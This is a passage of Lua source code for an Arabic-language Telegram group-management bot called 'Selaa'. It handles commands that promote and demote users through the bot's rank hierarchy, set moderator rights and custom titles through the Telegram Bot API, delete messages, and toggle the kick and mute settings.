ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة المطورين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مطور (%d+)') and SourceCh(msg) then
local user = text:match('رفع مطور (%d+)')
Selaa:sadd(Selaa..'Selaa:SudoBot:',user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة المطورين")  
end
--     Source Selaa     --
--       Rem SudoBot      --
if text ==('تنزيل مطور') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطور @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة المطورين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مطور (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مطور (%d+)')
Selaa:srem(Selaa..'Selaa:SudoBot:',user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة المطورين")  
end end
--     Source Selaa     --
--      Set ManagerAll    --
if SudoBot(msg) then
if text ==('رفع مدير عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
Selaa:sadd(Selaa..'Selaa:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:sadd(Selaa..'Selaa:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة المدراء العامين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير عام (%d+)')
Selaa:sadd(Selaa..'Selaa:ManagerAll:',user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة المدراء العامين")  
end
--     Source Selaa     --
--      Rem ManagerAll    --
if text ==('تنزيل مدير عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة المدراء العامين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
Selaa:srem(Selaa..'Selaa:ManagerAll:',user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة المدراء العامين")  
end end
--     Source Selaa     --
--      Set adminall      --
if ManagerAll(msg) then
if text ==('رفع ادمن عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
Selaa:sadd(Selaa..'Selaa:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:sadd(Selaa..'Selaa:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة الادمنيه العامين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن عام (%d+)')
Selaa:sadd(Selaa..'Selaa:AdminAll:',user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة الادمنيه العامين")  
end
--     Source Selaa     --
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة الادمنيه العامين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
Selaa:srem(Selaa..'Selaa:AdminAll:',user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة الادمنيه العامين")  
end end
--     Source Selaa     --
--       Set Vipall       --
if AdminAll(msg) then
if text ==('رفع مميز عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
Selaa:sadd(Selaa..'Selaa:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:sadd(Selaa..'Selaa:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة المميزين العام")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز عام (%d+)')
Selaa:sadd(Selaa..'Selaa:VipAll:',user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة المميزين العام")  
end
--     Source Selaa     --
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة المميزين العام")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
Selaa:srem(Selaa..'Selaa:VipAll:',user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة المميزين العام")  
end end
--     Source Selaa     --
--  Set BasicConstructor  --
if ChatType == 'sp' or ChatType == 'gp'  then
if SelaaConstructor(msg) then
if text ==('رفع منشئ اساسي') and SourceCh(msg) then
function raf_reply(extra, result, success)
Selaa:sadd(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:sadd(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه منشئ اساسي")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
Selaa:sadd(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه منشئ اساسي")  
end
--     Source Selaa     --
--  Rem BasicConstructor  --
if text ==('تنزيل منشئ اساسي') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله منشئ اساسي")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله منشئ اساسي")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله منشئ اساسي")  
end end
if text ==('رفع منشئ اساسي') and not SelaaConstructor(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆هذا الامر لمنشئ المجموعه والمطورين فقط', 1, 'md')
end
--     Source Selaa     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('رفع منشئ') and SourceCh(msg) then
function raf_reply(extra, result, success)
Selaa:sadd(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:sadd(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة المنشئين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and SourceCh(msg) then
local user = text:match('رفع منشئ (%d+)')
Selaa:sadd(Selaa..'Selaa:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة المنشئين")  
end
--     Source Selaa     --
--    Rem  Constructor    --
if text ==('تنزيل منشئ') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة المنشئين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة المنشئين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منشئ (%d+)')
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة المنشئين")  
end 
end
--     Source Selaa     --
--      Set Manager       --
if Constructor(msg) then
if text ==('رفع مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:sadd(Selaa..'Selaa:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة المدراء")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:sadd(Selaa..'Selaa:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة المدراء")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير (%d+)')
Selaa:sadd(Selaa..'Selaa:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة المدراء")  
end
--     Source Selaa     --
--       Rem Manager      --
if text ==('تنزيل مدير') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة المدراء")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة المدراء")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير (%d+)')
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة المدراء")  
end 
--     Source Selaa     --
--       Set Cleaner      --
if text ==('رفع منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:sadd(Selaa..'Selaa:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع منظف @(.*)') and SourceCh(msg) then
local username = text:match('^رفع منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:sadd(Selaa..'Selaa:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة المنظفين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منظف (%d+)') and SourceCh(msg) then
local user = text:match('رفع منظف (%d+)')
Selaa:sadd(Selaa..'Selaa:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة المنظفين")  
end
--     Source Selaa     --
--       Rem Cleaner      --
if text ==('تنزيل منظف') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة المنظفين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منظف @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل منظف @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة المنظفين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منظف (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل منظف (%d+)')
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة المنظفين")  
end end
--     Source Selaa     --
--       Set admin        --
if Manager(msg) then
if text ==('رفع ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and Selaa:get(Selaa.."Selaa:Lock:ProSet"..msg.chat_id_) then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and Selaa:get(Selaa.."Selaa:Lock:ProSet"..msg.chat_id_) then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة الادمنيه")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن (%d+)')
if not BasicConstructor(msg) and Selaa:get(Selaa.."Selaa:Lock:ProSet"..msg.chat_id_) then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
Selaa:sadd(Selaa..'Selaa:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة الادمنيه")  
end
--     Source Selaa     --
--        Rem admin       --
if text ==('تنزيل ادمن') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة الادمنيه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة الادمنيه")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن (%d+)')
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة الادمنيه")  
end end
--     Source Selaa     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('رفع مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
if not BasicConstructor(msg) and Selaa:get(Selaa.."Selaa:Lock:ProSet"..msg.chat_id_) then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
Selaa:sadd(Selaa..'Selaa:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if not BasicConstructor(msg) and Selaa:get(Selaa.."Selaa:Lock:ProSet"..msg.chat_id_) then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
if result.id_ then
Selaa:sadd(Selaa..'Selaa:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم رفعه في قائمة المميزين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز (%d+)')
if not BasicConstructor(msg) and Selaa:get(Selaa.."Selaa:Lock:ProSet"..msg.chat_id_) then 
Selaa(msg.chat_id_, msg.id_, 1,'↯☆لاتستطيع رفع احد وذالك بسبب تعطيل الرفع من قبل المنشئيين', 1, 'md')
return false
end
Selaa:sadd(Selaa..'Selaa:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم رفعه في قائمة المميزين")  
end
--     Source Selaa     --
--       Rem Vipmem       --
if text ==('تنزيل مميز') and SourceCh(msg) then
function prom_reply(extra, result, success)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من قائمة المميزين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من قائمة المميزين")  
else 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز (%d+)')
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"reply","↯☆تم تنزيله من قائمة المميزين")  
end end 
--     Source Selaa     --
if BasicConstructor(msg) then
if text and text:match("^رفع مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه مشرف في المجموعه")  
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل مشرف$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من مشرفين المجموعه")  
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^رفع بكل الصلاحيات$") or text:match("^رفع بكل صلاحيات$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه مشرف في جميع الصلاحيات")  
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")) and SourceCh(msg) then
local Selaa = text:match("^وضع لقب (.*)$") or text:match("^رفع مشرف (.*)$") or text:match("^ضع لقب (.*)$")
function ReplySet(extra, result, success)
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم اضافة ⇇ "..Selaa.." كلقب له")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..Selaa)
end
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
--     Source Selaa     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^مسح$") or text:match("^حذف$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حذف الرساله مع رسالة الامر', 1, 'md')
end end end
--     Source Selaa     --
if Constructor(msg) then
if text:match("^تفعيل الحظر$") and ChCheck(msg) or text:match("^تفعيل الطرد$") and ChCheck(msg) then
Selaa:del(Selaa.."Selaa:Lock:KickBan"..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الطرد والحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if text:match("^تعطيل الحظر$") and ChCheck(msg) or text:match("^تعطيل الطرد$") and ChCheck(msg) then
Selaa:set(Selaa.."Selaa:Lock:KickBan"..msg.chat_id_,"true")
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل الطرد والحظر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if text:match("^تفعيل الكتم$") and ChCheck(msg) or text:match("^تفعيل التقييد$") and ChCheck(msg) then
Selaa:del(Selaa.."Selaa:Lock:MuteTked"..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل الكتم والتقيد'
